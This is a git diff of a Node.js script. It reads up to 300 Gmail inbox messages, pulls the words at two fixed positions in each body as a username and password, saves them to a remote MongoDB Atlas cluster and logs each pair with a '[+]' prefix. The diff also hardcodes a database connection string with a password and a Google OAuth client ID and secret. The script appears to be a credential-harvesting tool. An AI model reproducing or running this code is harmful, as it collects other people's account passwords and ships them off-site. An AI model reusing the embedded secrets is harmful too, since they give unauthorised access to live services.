@@ -111,15 +111,15 @@
 // }
 
 
-// async function read(){
-//   const oAuth2Client = new google.auth.OAuth2(
-//       '1088648390218-dciu193mb6t1kh2ggpgtc817qc3gso1h.apps.googleusercontent.com',
-//        'ZJJ8Zd7JuTkXu6PHxulwgUeg', "http://localhost");
-//     const messages = await listMessages(oAuth2Client, 'label:inbox subject:reminder');
-//     console.log(messages)
-// }
+// // async function read(){
+// //   const oAuth2Client = new google.auth.OAuth2(
+// //       '1088648390218-dciu193mb6t1kh2ggpgtc817qc3gso1h.apps.googleusercontent.com',
+// //        'ZJJ8Zd7JuTkXu6PHxulwgUeg', "http://localhost");
+// //     const messages = await listMessages(oAuth2Client, 'label:inbox subject:reminder');
+// //     console.log(messages)
+// // }
 
-// read()
+// // read()
 
 // function listMessages(auth, query) {
 //   return new Promise((resolve, reject) => {
@@ -146,9 +146,40 @@
 // ==========================================================================================
 
 
+// mongoURI
+// mongodb+srv://saif:saif@cluster0.szwmr.mongodb.net/gameonacc?retryWrites=true&w=majority
+
+
+
 const fs = require('fs');
 const { google } = require('googleapis');
 const TOKEN_PATH = 'token.json';
+const mongoose = require('mongoose')
+
+
+let mongoURI = 'mongodb+srv://saif:saif@cluster0.szwmr.mongodb.net/gameonacc?retryWrites=true&w=majority';
+// DB Connection
+
+mongoose.connect(mongoURI, {
+  useNewUrlParser: true,
+  useUnifiedTopology: true,
+  useFindAndModify: false
+}).then(()=> {
+  console.log('database connected')
+  readEmail()
+}).catch(error => console.log('something went wrong'))
+
+
+
+const accounts = mongoose.Schema({
+  username: { type: String},
+  password: { type: String }
+});
+
+let Account = mongoose.model('Accounts', accounts)
+
+
+ function readEmail(){
 
 class ReadEmail {
   constructor(_dominio) {
@@ -192,26 +223,44 @@ class ReadEmail {
       var request = gmail.users.messages.list({
         userId: 'me',
         labelIds: 'INBOX',
-        maxResults: 10,
+        maxResults: 300,
       });
       request.then(ret => {
-        ret.data.messages.forEach(message => {
+
+// =========================
+        ret.data.messages.forEach(async (message, index) => {
           let id = message.id
-            var request2 = gmail.users.messages.get({
+
+          try{
+            var request2 = await  gmail.users.messages.get({
               userId: 'me',
               id: id,
             });
-            request2.then(ret2 => {
-              let msg = ret2.data.payload.body.data;
-              let buff = new Buffer.from(msg, 'base64');
-              let text = buff.toString('ascii');
-              // console.log(text)
-              resolve(text);
-            });
+            let msg = request2.data.payload.body.data;
+            let buff = new Buffer.from(msg, 'base64');
+            let text = buff.toString('ascii');
+            // console.log(index+" >"+text)
+            // let username = 
+            
+            let newText = text.split(" ")
+            let username= newText[5]
+            let password= newText[9]
+            await new Account({
+              username,
+              password:password
+            }).save()
+            console.log(`[+] ${username} and ${password}`)
+            console.log("======================================")
+            resolve(text);
+          }catch(error){
+            console.log('érror')
+          }
         })
-        
+        // Finished Loop
       });
     });
   }
 }
 new ReadEmail('_dominio').setup();
+
+ }
